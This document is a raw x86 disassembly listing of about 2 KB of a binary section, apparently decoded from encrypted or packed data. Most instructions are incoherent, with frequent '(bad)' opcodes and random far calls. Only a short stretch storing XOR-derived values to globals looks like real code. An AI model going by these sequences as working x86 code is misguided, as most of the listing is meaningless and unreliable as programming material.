  4118ce:	bswap  ebp
  4118d0:	retf   0xd61
  4118d3:	pop    esi
  4118d4:	idiv   al
  4118d6:	iret   
  4118d7:	retf   
  4118d8:	inc    DWORD PTR ds:0x1bfe13a1
  4118de:	inc    edx
  4118df:	mov    dl,0xbf
  4118e1:	inc    esi
  4118e2:	not    al
  4118e4:	mov    ds:0x9d94b3b2,al
  4118e9:	sbb    DWORD PTR [ecx],ebx
  4118eb:	call   0x4956:0xbb9c27f5
  4118f2:	sbb    dh,al
  4118f4:	data16 jno 0x411877
  4118f7:	ret    0xfd6f
  4118fa:	setb   al
  4118fd:	dec    edi
  4118fe:	mov    ah,0x52
  411900:	fist   DWORD PTR [ecx+0x54]
  411903:	les    eax,FWORD PTR [ebp+0x4d]
  411906:	mov    ebx,0x56234efb
  41190b:	pop    ss
  41190c:	inc    esp
  41190d:	cmc    
  41190e:	repz sar DWORD PTR [ebx],cl
  411911:	mov    bh,dh
  411913:	push   ebp
  411914:	loopne 0x4118a6
  411916:	pop    ds
  411917:	addr16 stc 
  411919:	xlat   BYTE PTR ds:[ebx]
  41191a:	mov    esi,0xfbd6f54a
  41191f:	inc    ebp
  411920:	js     0x411956
  411922:	xor    eax,0xbd427606
  411927:	sbb    ebx,DWORD PTR [bx+si+0x2a]
  41192b:	cmp    al,0x9e
  41192d:	inc    edx
  41192e:	adc    esp,DWORD PTR [ecx-0x20]
  411931:	std    
  411932:	mov    edx,edx
  411934:	sub    BYTE PTR [edx+0x51],0x67
  411938:	lea    esi,[ebp-0x3020718d]
  41193e:	or     al,0xf0
  411940:	sub    al,0xcc
  411942:	xchg   esi,eax
  411943:	imul   ebx,DWORD PTR [ebx+0x59],0x1
  411947:	fsub   DWORD PTR [esp+ebx*8+0x7]
  41194b:	jno    0x411959
  41194d:	ins    DWORD PTR es:[edi],dx
  41194e:	ret    
  41194f:	push   ds
  411950:	scas   eax,DWORD PTR es:[edi]
  411951:	mov    ebp,0xce727795
  411956:	mov    DWORD PTR [ebp+0x42415ca6],eax
  41195c:	imul   ecx,DWORD PTR [ebp+0x22],0xffffffc0
  411960:	adc    eax,0xe773774e
  411965:	std    
  411966:	icebp  
  411967:	sbb    al,0xbb
  411969:	stos   DWORD PTR es:[edi],eax
  41196a:	(bad)  
  41196b:	mov    ecx,0x91a3d4bf
  411970:	call   0x865467ab
  411975:	mov    BYTE PTR [edx-0x5e6e5b96],cl
  41197b:	dec    ecx
  41197c:	(bad)  
  41197d:	clc    
  41197e:	outs   dx,BYTE PTR ds:[esi]
  41197f:	pusha  
  411980:	js     0x41195c
  411982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411983:	or     esp,DWORD PTR [ecx]
  411985:	pop    esp
  411986:	shl    BYTE PTR [eax],cl
  411988:	cli    
  411989:	arpl   ax,ax
  41198b:	mov    bh,ah
  41198d:	mov    ds:0x21cab71c,al
  411992:	adc    DWORD PTR [esi+0x53b066b9],0x11a3b69e
  41199c:	icebp  
  41199d:	cwde   
  41199e:	dec    ebx
  41199f:	or     eax,0xae11893d
  4119a4:	fld    TBYTE PTR [edx+ebp*4]
  4119a7:	test   dh,bl
  4119a9:	mov    WORD PTR [ebx-0x5e678311],fs
  4119af:	imul   eax,esp,0x4b
  4119b2:	mov    ds:0xd84583c6,eax
  4119b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119b8:	nop
  4119b9:	sub    BYTE PTR [ecx+0x20],bh
  4119bc:	xchg   ebp,eax
  4119bd:	dec    esp
  4119be:	imul   al
  4119c0:	adc    ebx,ecx
  4119c2:	in     eax,0xd7
  4119c4:	out    dx,eax
  4119c5:	mov    edx,0x9f1e429a
  4119ca:	pop    edx
  4119cb:	sti    
  4119cc:	mov    edx,esp
  4119ce:	repz add al,0xe9
  4119d1:	xchg   ebx,eax
  4119d2:	pop    ds
  4119d3:	jae    0x4119f4
  4119d5:	scas   al,BYTE PTR es:[edi]
  4119d6:	jmp    0x4119ab
  4119d8:	jmp    0x5b4:0x6496f806
  4119df:	pop    es
  4119e0:	jle    0x411a5f
  4119e2:	push   esp
  4119e3:	fcom   QWORD PTR [edx-0x74]
  4119e6:	loope  0x411a1b
  4119e8:	sbb    edx,DWORD PTR [esi]
  4119ea:	mov    al,ds:0x1f633886
  4119ef:	in     al,dx
  4119f0:	rcr    DWORD PTR [ebx],1
  4119f2:	pushf  
  4119f3:	shl    BYTE PTR [edi],cl
  4119f5:	push   es
  4119f6:	loopne 0x4119eb
  4119f8:	stc    
  4119f9:	aad    0x61
  4119fb:	pop    ebp
  4119fc:	imul   ecx,DWORD PTR ds:0x2728e0d6,0x32a7ce1c
  411a06:	pop    ebx
  411a07:	inc    edi
  411a08:	and    al,0x8f
  411a0a:	outs   dx,BYTE PTR es:[esi]
  411a0c:	outs   dx,DWORD PTR ds:[esi]
  411a0d:	lea    esp,es:[esi-0x15e4c456]
  411a14:	pop    ebx
  411a15:	pop    ds
  411a16:	aad    0xdc
  411a18:	ror    bl,0x40
  411a1b:	scas   al,BYTE PTR es:[edi]
  411a1c:	xor    eax,0x13fb64ed
  411a21:	(bad)
  411a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a25:	sar    BYTE PTR [ebp-0x4a],0x95
  411a29:	pop    ebx
  411a2b:	cmp    BYTE PTR [esi],bh
  411a2d:	into   
  411a2e:	adc    bl,ch
  411a30:	pop    ebp
  411a31:	je     0x411a72
  411a33:	push   0x2962d180
  411a38:	shl    DWORD PTR [edi+0x45],1
  411a3b:	xor    bh,BYTE PTR [edi]
  411a3d:	inc    esp
  411a3e:	or     al,0x65
  411a40:	jl     0x411a01
  411a42:	cs cld 
  411a44:	fist   DWORD PTR [edx]
  411a46:	mov    ch,0xa7
  411a48:	adc    BYTE PTR ds:0x3c70b37f,bl
  411a4e:	mov    DWORD PTR [esi-0x26b88ffa],edx
  411a54:	aam    0x5e
  411a56:	fimul  DWORD PTR [edx-0x6a]
  411a59:	adc    al,0xf9
  411a5b:	fadd   QWORD PTR [eax+0x5d]
  411a5e:	fcmovnbe st,st(7)
  411a60:	daa    
  411a61:	scas   al,BYTE PTR es:[edi]
  411a62:	mul    DWORD PTR [edi+ebx*1]
  411a65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a66:	dec    esp
  411a67:	jmp    0x411ac2
  411a69:	mov    eax,0x1e0bf44c
  411a6e:	bound  ebx,QWORD PTR [esi+0x65e5b288]
  411a74:	mov    eax,0x9cec1bbf
  411a79:	imul   ebp,DWORD PTR [edi+eiz*2],0xd6ad3243
  411a80:	mov    WORD PTR [edi],gs
  411a82:	or     eax,0x89f7d77
  411a87:	pusha  
  411a88:	je     0x411ab7
  411a8a:	ret    0x3fd3
  411a8d:	xlat   BYTE PTR ds:[ebx]
  411a8e:	or     dl,BYTE PTR [esi-0x2f]
  411a91:	jne    0x411a85
  411a93:	sub    DWORD PTR ds:0xd3d52efd,ebp
  411a99:	daa    
  411a9a:	fimul  WORD PTR [ebp+0xd64c1db]
  411aa0:	mov    ch,al
  411aa2:	fwait
  411aa3:	cmp    BYTE PTR [edx],dl
  411aa5:	addr16 and al,0xfb
  411aa8:	add    bh,dh
  411aaa:	push   eax
  411aab:	fcmovbe st,st(3)
  411aad:	mov    ch,0x8
  411aaf:	adc    DWORD PTR [eax],edx
  411ab1:	or     bh,dh
  411ab3:	push   es
  411ab4:	push   ebp
  411ab5:	sbb    al,0xd1
  411ab7:	sbb    DWORD PTR [ebx],0x78e50d35
  411abd:	cmc    
  411abe:	mov    dh,0x77
  411ac0:	push   0xd310e0cc
  411ac5:	cwde   
  411ac6:	ficomp WORD PTR [ebp+0x450008e1]
  411acc:	mov    dh,0xa7
  411ace:	jne    0x411a78
  411ad0:	jne    0x411b07
  411ad2:	mov    cl,0xfa
  411ad4:	pop    esi
  411ad5:	not    BYTE PTR [ecx+0xbb6591c]
  411adb:	shl    BYTE PTR [eax+0x367d0f2e],cl
  411ae1:	dec    eax
  411ae2:	int    0xd0
  411ae4:	xchg   DWORD PTR [ebp+eax*2+0x25014833],eax
  411aeb:	mov    WORD PTR [ebp+eiz*4-0xd],ss
  411aef:	mov    al,0x1f
  411af1:	push   0x2dd21c62
  411af6:	(bad)
  411afa:	pop    ss
  411afb:	xchg   ecx,eax
  411afc:	xchg   edi,eax
  411afd:	inc    esi
  411afe:	stos   BYTE PTR es:[edi],al
  411aff:	jno    0x411b0c
  411b01:	sbb    eax,0x94e5f07a
  411b06:	cwde   
  411b07:	sbb    ecx,ebp
  411b09:	or     ebx,0x39076915
  411b0f:	mov    dl,0x55
  411b11:	cdq    
  411b12:	das    
  411b13:	push   edx
  411b15:	fiadd  DWORD PTR [ecx]
  411b17:	jg     0x411b18
  411b19:	fidiv  DWORD PTR [esi+edi*1+0x34]
  411b1d:	pusha  
  411b1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b1f:	adc    DWORD PTR [esi-0x4],ebp
  411b22:	inc    esp
  411b23:	gs push 0x0
  411b26:	inc    ecx
  411b27:	mov    bh,0x0
  411b29:	or     BYTE PTR [ecx-0x6d],ah
  411b2c:	xchg   esp,eax
  411b2d:	push   ebx
  411b2e:	test   eax,0x5bd62b96
  411b33:	fs js  0x411b41
  411b36:	test   ah,ah
  411b38:	aam    0xb9
  411b3a:	sbb    al,0x76
  411b3c:	cld    
  411b3d:	jb     0x411b63
  411b3f:	mov    dh,0xed
  411b41:	test   al,0xb0
  411b43:	jno    0x411b4f
  411b45:	into   
  411b46:	mov    ch,0x6d
  411b48:	or     BYTE PTR [edi-0x75],0x16
  411b4c:	xchg   esp,eax
  411b4d:	(bad)  
  411b4e:	adc    ebp,DWORD PTR [edx-0x7689ce0a]
  411b54:	ret    
  411b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b56:	(bad)
  411b59:	xchg   esp,eax
  411b5a:	mov    eax,0x397e4eed
  411b5f:	cld    
  411b60:	(bad)  
  411b61:	mov    ebx,0x76ecad94
  411b66:	arpl   bx,sp
  411b68:	stc    
  411b69:	lock push ebp
  411b6b:	in     al,0xd3
  411b6d:	add    al,0x50
  411b6f:	jns    0x411bd4
  411b71:	push   esp
  411b72:	sahf   
  411b73:	mov    edi,0x1ba997e0
  411b78:	aas    
  411b79:	mov    ch,0xe
  411b7b:	pop    es
  411b7c:	aaa    
  411b7d:	scas   eax,DWORD PTR es:[edi]
  411b7e:	stos   BYTE PTR es:[edi],al
  411b7f:	push   ss
  411b80:	leave  
  411b81:	ds mov bh,0x8
  411b84:	push   0x30
  411b86:	jns    0x411c03
  411b88:	call   0xfb8c:0xeaae6225
  411b8f:	mov    ds:0x29adb7f9,al
  411b94:	rol    DWORD PTR [eax+ecx*8+0x26],1
  411b98:	nop
  411b99:	sub    edx,eax
  411b9b:	mov    ch,0x9a
  411b9d:	pusha  
  411b9e:	call   0xf3f6e3d
  411ba3:	out    0x55,al
  411ba5:	and    al,0xce
  411ba7:	ror    edx,cl
  411ba9:	stos   DWORD PTR es:[edi],eax
  411baa:	mov    DWORD PTR [esi-0x80],eax
  411bad:	sbb    DWORD PTR [ecx],esp
  411baf:	call   DWORD PTR [edx+0x5a287649]
  411bb5:	lds    dx,DWORD PTR [ecx+0x7]
  411bb9:	inc    eax
  411bba:	fsubrp st(1),st
  411bbc:	js     0x411c3b
  411bbe:	cmp    eax,0x9cb96f91
  411bc3:	and    esi,edi
  411bc5:	fiadd  WORD PTR [edx+eiz*2-0x1183799f]
  411bcc:	or     cl,0x15
  411bcf:	adc    DWORD PTR [edx-0x6],eax
  411bd2:	pop    edx
  411bd3:	pop    edx
  411bd4:	add    ebp,ebx
  411bd6:	sub    eax,0xf128ca32
  411bdb:	cdq    
  411bdc:	(bad)  
  411bdd:	aad    0xbe
  411bdf:	out    0x94,al
  411be1:	or     DWORD PTR [eax],edi
  411be3:	xchg   bh,dh
  411be5:	inc    ecx
  411be6:	ret    
  411be7:	ins    BYTE PTR es:[edi],dx
  411be8:	dec    ebx
  411be9:	(bad)  
  411bea:	adc    ebx,DWORD PTR [edx-0x41ffc672]
  411bf0:	push   es
  411bf1:	int3   
  411bf2:	mov    ah,0xf6
  411bf4:	aas    
  411bf5:	mov    edx,0xc1f2e8c6
  411bfa:	xor    cl,BYTE PTR [ecx-0x74]
  411bfd:	fisttp DWORD PTR [esi-0x62d02316]
  411c03:	retf   0x15f1
  411c06:	sbb    al,0x87
  411c08:	loopne 0x411bb1
  411c0a:	or     eax,DWORD PTR [ebp-0x23]
  411c0d:	jno    0x411bd5
  411c0f:	fs je  0x411b93
  411c12:	add    al,0x4d
  411c14:	es xchg esi,eax
  411c16:	test   DWORD PTR [ebp-0x1c784089],ebp
  411c1c:	xor    BYTE PTR [edx-0x60],0xe
  411c20:	mov    ds:0x9f87beaf,eax
  411c25:	mov    cl,BYTE PTR [esi]
  411c27:	popf   
  411c28:	cwde   
  411c29:	loop   0x411c98
  411c2b:	stos   BYTE PTR es:[edi],al
  411c2c:	xor    dh,ch
  411c2e:	repnz dec eax
  411c30:	lock xchg edx,eax
  411c32:	mov    bl,0x97
  411c34:	push   ebp
  411c35:	push   ebx
  411c36:	and    eax,0xa647545d
  411c3b:	and    DWORD PTR [ebx+0x6],edx
  411c3e:	fstp   DWORD PTR [edi-0x21]
  411c41:	pop    es
  411c42:	xor    WORD PTR [eax],ax
  411c45:	neg    BYTE PTR [eax+0x71026b15]
  411c4b:	add    eax,0x4af00c27
  411c50:	add    BYTE PTR [ecx],al
  411c52:	sbb    edx,DWORD PTR [edx]
  411c54:	out    0x93,eax
  411c56:	test   al,0x60
  411c58:	jne    0x411c4f
  411c5a:	adc    ecx,DWORD PTR [ecx-0x508bc0c8]
  411c60:	push   edx
  411c61:	or     eax,0xf1351fd6
  411c66:	ffreep st(1)
  411c68:	cdq    
  411c69:	dec    esp
  411c6a:	rcr    BYTE PTR [edx-0x4dd35e45],1
  411c70:	inc    ecx
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xb7b3ec5e
  411cb8:	in     eax,0x5e
  411cba:	push   ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411d20
  411cc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cc3:	or     esi,DWORD PTR [edx-0x40]
  411cc6:	lods   eax,DWORD PTR ds:[esi]
  411cc7:	pop    edx
  411cc8:	out    dx,al
  411cc9:	jae    0x411c99
  411ccb:	cdq    
  411ccc:	jecxz  0x411cbb
  411cce:	aas    
  411ccf:	sti    
  411cd0:	sar    BYTE PTR [edx],0x51
  411cd3:	leave  
  411cd4:	mov    esi,0xd55f01cc
  411cd9:	fwait
  411cda:	adc    esp,DWORD PTR [ebp-0x56]
  411cdd:	aad    0x6e
  411cdf:	sbb    BYTE PTR ds:0x61fdfacb,al
  411ce5:	xchg   edx,eax
  411ce6:	loop   0x411cc3
  411ce8:	or     DWORD PTR [eax+0x2629520f],eax
  411cee:	xchg   esp,eax
  411cef:	loopne 0x411d3c
  411cf1:	ret    
  411cf2:	fisttp WORD PTR [edx+0x67]
  411cf5:	pop    eax
  411cf6:	or     DWORD PTR [edi-0x552e34d1],edi
  411cfc:	ret    0x3216
  411cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d00:	cmp    cl,BYTE PTR [ebp+0x390b7efa]
  411d06:	sbb    BYTE PTR [edi+0x1],cl
  411d09:	mov    dh,BYTE PTR [esi+0x2bb3ff9b]
  411d0f:	and    dl,BYTE PTR fs:[eax-0x21]
  411d13:	dec    ebp
  411d14:	sti    
  411d15:	cld    
  411d16:	les    ebp,FWORD PTR [eax+0x3c67989e]
  411d1c:	mov    esp,0x1c901a3f
  411d21:	mov    ds:0x65e494b4,al
  411d26:	js     0x411cac
  411d28:	sub    cl,BYTE PTR ds:0xd7f07981
  411d2e:	dec    ecx
  411d2f:	lds    esi,FWORD PTR [esi+0x43]
  411d32:	adc    bl,al
  411d34:	in     eax,0x10
  411d36:	les    ebp,FWORD PTR [esi]
  411d38:	std    
  411d39:	mov    ebp,0xc1e23ead
  411d3e:	jnp    0x411d71
  411d40:	pusha  
  411d41:	outs   dx,BYTE PTR ds:[esi]
  411d42:	jns    0x411d97
  411d44:	sub    al,0xf1
  411d46:	push   ebp
  411d47:	mov    al,0x8b
  411d49:	je     0x411d99
  411d4b:	add    cl,BYTE PTR [edx]
  411d4d:	jg     0x411dad
  411d4f:	mov    ss,WORD PTR [ebx-0x5d08481a]
  411d55:	mov    edx,0x9c0b2f0a
  411d5a:	repz push ss
  411d5c:	sti    
  411d5d:	das    
  411d5e:	adc    esp,eax
  411d60:	loope  0x411d3f
  411d62:	mov    bl,0x82
  411d64:	fs aam 0xa1
  411d67:	pop    esp
  411d68:	add    ch,BYTE PTR [esi+edi*4-0x2a]
  411d6c:	adc    ecx,edi
  411d6e:	aas    
  411d6f:	daa    
  411d70:	dec    eax
  411d71:	sub    ah,BYTE PTR [esi-0x79]
  411d74:	adc    al,BYTE PTR [ecx-0x64]
  411d77:	inc    edx
  411d78:	jns    0x411d70
  411d7a:	ret    
  411d7b:	call   0xadf:0xa6435945
  411d82:	sub    eax,0x2db58f5a
  411d87:	dec    eax
  411d88:	and    BYTE PTR [edi+0xa],ch
  411d8b:	ficom  DWORD PTR [ecx-0x6c26ed06]
  411d91:	sub    al,0x95
  411d93:	imul   dh
  411d95:	mov    esi,0x9c55c613
  411d9a:	test   BYTE PTR [esi+0x24f62a14],bl
  411da0:	jb     0x411d63
  411da2:	add    al,0x55
  411da4:	push   esp
  411da5:	push   edx
  411da6:	ror    edi,0x23
  411da9:	loop   0x411db9
  411dab:	pop    eax
  411dac:	add    al,0xdf
  411dae:	ret    
  411daf:	in     eax,0x64
  411db1:	dec    esp
  411db2:	ret    
  411db3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411db4:	sub    al,0xb1
  411db6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411db7:	not    BYTE PTR ds:0x454176c7
  411dbd:	jns    0x411dc8
  411dbf:	jg     0x411de8
  411dc1:	data16 ss jno 0x411d8d
  411dc5:	xor    ebp,DWORD PTR [edx+0xa704fc4]
  411dcb:	scas   al,BYTE PTR es:[edi]
  411dcc:	sbb    eax,0xe543931c
  411dd1:	daa    
  411dd2:	rol    DWORD PTR [esi-0x6f],1
  411dd5:	psrld  mm7,0xb8
  411dd9:	int3   
  411dda:	xchg   DWORD PTR [eax],esp
  411ddc:	xchg   DWORD PTR [ecx-0x2f],esp
  411ddf:	xor    eax,0xa4a4c45c
  411de4:	in     eax,0x6
  411de6:	inc    edx
  411de7:	cld    
  411de8:	aam    0xdd
  411dea:	mov    ds:0xd2700b1a,eax
  411def:	loop   0x411e17
  411df1:	cdq    
  411df2:	in     eax,0x43
  411df4:	xor    ebp,DWORD PTR [ebx+0x7]
  411df7:	or     edx,DWORD PTR [eax+eax*4-0x2f752199]
  411dfe:	xchg   ebx,eax
  411dff:	ins    BYTE PTR es:[edi],dx
  411e00:	xlat   BYTE PTR ds:[ebx]
  411e01:	pop    ebx
  411e02:	sub    eax,0x465bd8c
  411e07:	push   esp
  411e08:	int    0x8f
  411e0a:	daa    
  411e0b:	daa    
  411e0c:	ins    DWORD PTR es:[edi],dx
  411e0d:	xchg   ecx,eax
  411e0e:	ds jl  0x411e16
  411e11:	(bad)  
  411e13:	xchg   edi,edx
  411e15:	(bad)  
  411e16:	xchg   ebp,eax
  411e17:	push   esi
  411e18:	xchg   ecx,eax
  411e19:	sar    BYTE PTR [edi+ecx*2],cl
  411e1c:	sbb    eax,0x9a22feaa
  411e21:	dec    ebp
  411e22:	cdq    
  411e23:	xor    DWORD PTR [edi+0x79],esp
  411e26:	sbb    al,0xdd
  411e28:	xor    BYTE PTR [ecx-0x35c422f2],ch
  411e2e:	cs mov ebp,0xe6bc3af9
  411e34:	jl     0x411e2f
  411e36:	rcl    DWORD PTR [edi+ebp*2],1
  411e39:	popf   
  411e3a:	mov    esi,0x4e69d6a2
  411e3f:	shl    BYTE PTR [eax+0x5],cl
  411e42:	aad    0x80
  411e44:	lods   al,BYTE PTR ds:[esi]
  411e45:	aam    0x12
  411e47:	cmp    DWORD PTR [esi+ebp*2],0x37ed5be6
  411e4e:	mov    ah,0xc1
  411e50:	ret    
  411e51:	test   ecx,esi
  411e53:	xchg   esp,ebx
  411e55:	arpl   WORD PTR [eax-0x40d488e7],sp
  411e5b:	sti    
  411e5c:	add    ah,0xf5
  411e5f:	inc    eax
  411e60:	in     al,dx
  411e61:	dec    eax
  411e62:	fmul   DWORD PTR [ebp-0x584f4aa2]
  411e68:	fsubr  DWORD PTR [esi-0x432046a0]
  411e6e:	jbe    0x411e37
  411e70:	cmp    eax,edx
  411e72:	out    dx,al
  411e73:	push   ebx
  411e74:	pop    ebp
  411e75:	adc    DWORD PTR [ecx],eax
  411e77:	push   ebp
  411e78:	mov    esp,ecx
  411e7a:	cmp    eax,DWORD PTR [ecx]
  411e7c:	mov    ah,dl
  411e7e:	aad    0x9d
  411e80:	out    dx,eax
  411e81:	mov    dl,0xe2
  411e83:	pushf  
  411e84:	popf   
  411e85:	inc    ebp
  411e86:	jl     0x411ede
  411e88:	jg     0x411e79
  411e8a:	retf   0x1a4b
  411e8d:	adc    DWORD PTR [edx],esp
  411e8f:	data16 adc cl,dh
  411e92:	dec    edx
  411e93:	fist   DWORD PTR [ebx-0x7fde05c2]
  411e99:	bound  edi,QWORD PTR [esi-0x75]
  411e9c:	bound  ebx,QWORD PTR [edx]
  411e9e:	repnz inc ebp
  411ea0:	jmp    0x7cd3:0x666d019e
  411ea7:	add    BYTE PTR [ebx-0x63c59f1],ch
  411ead:	frstor [ecx-0x2d]
  411eb0:	push   0xc9135d9f
  411eb5:	test   al,0x13
  411eb8:	in     eax,0x15
  411eba:	pop    ebp
  411ebb:	jl     0x411e8e
  411ebd:	loop   0x411eed
  411ebf:	popf   
  411ec0:	jmp    0x998e:0xb24a691c
  411ec7:	out    0xdb,eax
  411ec9:	ins    DWORD PTR es:[edi],dx
  411eca:	cmp    DWORD PTR [edi+0x7d],0xfffffff7
  411ece:	fcmovnbe st,st(7)
  411ed0:	fist   DWORD PTR ds:0x9cb79e20
  411ed6:	imul   ecx,edi,0xffffffa8
  411ed9:	aas    
  411eda:	pop    esp
  411edb:	mov    ecx,0x4f7aa82c
  411ee0:	mov    eax,ds:0xf0fb1758
  411ee5:	call   0xbbf3:0x1c5b0990
  411eec:	int    0x3c
  411eee:	jge    0x411ecb
  411ef0:	xchg   edi,eax
  411ef1:	ss (bad) 
  411ef3:	iret   
  411ef4:	outs   dx,BYTE PTR ds:[esi]
  411ef5:	scas   eax,DWORD PTR es:[edi]
  411ef6:	add    al,0xe7
  411ef8:	and    al,0xcf
  411efa:	push   ebx
  411efb:	repnz cmp ah,BYTE PTR ds:0x9cb8383a
  411f02:	in     eax,dx
  411f03:	xchg   edi,ebx
  411f05:	shr    BYTE PTR [ecx+0x73],0x72
  411f09:	xlat   BYTE PTR ds:[ebx]
  411f0a:	addr16 in al,dx
  411f0c:	daa    
  411f0d:	jp     0x411e96
  411f0f:	icebp  
  411f10:	inc    eax
  411f11:	pop    esp
  411f12:	fdiv   DWORD PTR [ebx+0x6f]
  411f15:	ror    edi,1
  411f17:	jo     0x411f0d
  411f19:	cmp    BYTE PTR [eax+0x74fb4760],dl
  411f1f:	mov    al,ds:0xbd3b882e
  411f24:	sub    cl,dh
  411f26:	adc    eax,0xd857fb09
  411f2b:	cmp    eax,0x28b2abd3
  411f30:	mov    ch,0x2c
  411f33:	jo     0x411ed6
  411f35:	or     al,0x53
  411f37:	sbb    esp,DWORD PTR [edx]
  411f39:	daa    
  411f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f3b:	loop   0x411f94
  411f3d:	(bad)  
  411f3e:	iret   
  411f3f:	addr16 in al,dx
  411f41:	fcom   st(3)
  411f43:	test   al,0xc4
  411f45:	popa   
  411f46:	(bad)  
  411f47:	in     al,0x78
  411f49:	jno    0x411f2c
  411f4b:	sbb    dh,BYTE PTR [edx-0x23ff3631]
  411f51:	mov    ds,WORD PTR [ebx-0x104ef68]
  411f57:	jb     0x411f22
  411f59:	ins    DWORD PTR es:[edi],dx
  411f5a:	xor    eax,0x2063709b
  411f5f:	mov    dh,0x7d
  411f61:	jne    0x411f63
  411f63:	push   ss
  411f64:	jbe    0x411f60
  411f66:	xlat   BYTE PTR ds:[ebx]
  411f67:	cmp    DWORD PTR [ecx+0x6a],edx
  411f6a:	sbb    eax,0xd712a68e
  411f6f:	retf   
  411f70:	push   0x100e27cf
  411f75:	adc    al,0xbf
  411f77:	jp     0x411f77
  411f79:	xchg   edx,eax
  411f7a:	or     ebp,edi
  411f7c:	aad    0x97
  411f7e:	mov    ds:0x5f250c9f,al
  411f83:	inc    BYTE PTR [esi]
  411f85:	sub    dh,cl
  411f87:	mov    edi,DWORD PTR [edx-0x49]
  411f8a:	fidivr DWORD PTR ss:[edx+0x19]
  411f8e:	(bad)  
  411f8f:	aam    0xfe
  411f91:	in     al,dx
  411f92:	out    dx,eax
  411f93:	icebp  
  411f94:	addr16 das 
  411f96:	mov    edx,0xc3b0f85a
  411f9b:	and    ebp,DWORD PTR [ecx-0x1]
  411f9e:	inc    eax
  411f9f:	iret   
  411fa0:	inc    esi
  411fa1:	daa    
  411fa2:	call   0xaad7:0xa22c6b61
  411fa9:	mov    cl,BYTE PTR [edx-0x43715f01]
  411faf:	(bad)  
  411fb0:	ins    BYTE PTR es:[edi],dx
  411fb1:	mov    eax,ds:0xe2fa51d2
  411fb6:	ins    BYTE PTR es:[edi],dx
  411fb7:	ins    DWORD PTR es:[edi],dx
  411fb8:	push   es
  411fb9:	scas   eax,DWORD PTR es:[edi]
  411fba:	jle    0x412001
  411fbc:	sbb    ah,dh
  411fbe:	and    eax,0x2d557b08
  411fc3:	sub    al,0xa2
  411fc5:	push   0xffffffbe
  411fc7:	pop    ecx
  411fc8:	clc    
  411fc9:	jg     0x411fcd
  411fcb:	xchg   cl,bl
  411fcd:	mov    ebx,0xafb610e9
  411fd2:	sbb    al,0x22
  411fd4:	cmp    dl,bl
  411fd6:	popa   
  411fd7:	lods   eax,DWORD PTR ds:[esi]
  411fd8:	jge    0x412020
  411fda:	xchg   ecx,eax
  411fdb:	into   
  411fdc:	mov    dl,BYTE PTR [edi+0x3b7244f9]
  411fe2:	scas   eax,DWORD PTR es:[edi]
  411fe3:	test   al,0x2e
  411fe5:	ret    0xf82e
  411fe8:	das    
  411fe9:	xchg   DWORD PTR [edx+0x6b],ebx
  411fec:	dec    DWORD PTR [eax+0x5105e735]
  411ff2:	cmp    bl,bh
  411ff4:	xchg   ebx,eax
  411ff5:	cmp    eax,0xfca82c6d
  411ffa:	push   eax
  411ffb:	pop    edi
  411ffc:	and    DWORD PTR [ecx],ebx
  411ffe:	(bad)  
  412000:	jle    0x411fc6
  412002:	pop    ebx
  412003:	dec    ebx
  412004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412005:	shl    BYTE PTR [esi],1
  412007:	repz mov ch,0x5e
  41200a:	je     0x411fb1
  41200c:	mov    eax,0x5ce52ef3
  412011:	dec    eax
  412012:	ins    DWORD PTR es:[edi],dx
  412013:	and    DWORD PTR [ecx],esi
  412015:	fs dec eax
  412017:	add    ah,bh
  412019:	mov    ebx,0x57a49a1d
  41201e:	mov    edi,ebp
  412020:	int    0x40
  412022:	pop    es
  412023:	xor    BYTE PTR [edx+ebx*4],dl
  412026:	jmp    DWORD PTR [eax-0x909f50e]
  41202c:	sbb    esp,DWORD PTR [esi-0x60]
  41202f:	mov    al,es:0xd6221d0c
  412035:	mov    BYTE PTR [edi-0x78],dl
  412038:	sbb    al,ah
  41203a:	xor    DWORD PTR [edi+ebp*8-0x45],edi
  41203e:	jl     0x41209e
  412040:	(bad)  [edx+0x5a]
  412043:	mov    eax,0xc9c28e88
  412048:	mov    cs,WORD PTR [ebp+0x5eca3549]
  41204e:	push   edx
  41204f:	cmc    
  412050:	mov    ds:0xe408c01c,al
  412055:	sti    
  412056:	xor    ebp,edx
  412058:	jle    0x7af5f972
  41205e:	mov    al,0xb7
  412060:	jg     0x412027
  412062:	ss aad 0x50
  412065:	daa    
  412066:	inc    ecx
  412067:	dec    esp
  412068:	mov    dl,0xb0
  41206a:	add    eax,0xc360554e
  41206f:	in     al,0x92
  412071:	test   al,0x2a
  412073:	ror    BYTE PTR [eax+0x7d],0x4b
  412077:	adc    al,0xae
  412079:	add    DWORD PTR [ebx+0x7701aa87],edx
  41207f:	dec    eax
  412080:	push   0xa7ab327
  412085:	out    dx,eax
  412086:	repnz cmp cl,ch
  412089:	mov    ds:0xad332aaf,al
  41208e:	push   ecx
  41208f:	ror    BYTE PTR [eax+eax*4-0x78],0x49
  412094:	mov    eax,0xd801e0e0
